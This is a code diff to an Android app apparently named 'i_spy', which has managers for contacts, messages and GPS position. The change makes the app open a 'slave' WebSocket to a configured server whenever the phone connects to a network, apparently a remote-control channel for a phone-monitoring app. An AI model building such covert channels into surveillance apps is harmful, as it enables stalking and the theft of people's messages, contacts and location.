@@ -6,10 +6,16 @@ import android.content.Intent;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 
+import com.um.asn.i_spy.Config;
 import com.um.asn.i_spy.managers.ContactManager;
 import com.um.asn.i_spy.managers.MessageManager;
 import com.um.asn.i_spy.managers.PositionGPSManager;
 import com.um.asn.i_spy.models.Phone;
+import com.um.asn.i_spy.websockets.SlaveWS;
+
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.WebSocket;
 
 public class ConnectionListener extends BroadcastReceiver {
 
@@ -21,6 +27,13 @@ public class ConnectionListener extends BroadcastReceiver {
         if (activeNetInfo != null && activeNetInfo.isConnected())
         {
             System.out.println("Connected !");
+
+            // Démarre la WebSocket
+            OkHttpClient client = new OkHttpClient();
+            Request request = new Request.Builder().url(Config.SERVER_WS).build();
+            SlaveWS listener = new SlaveWS(context);
+            WebSocket ws = client.newWebSocket(request, listener);
+            client.dispatcher().executorService().shutdown();
 
             Phone phone = new Phone();
             phone.loadWithFile(context);
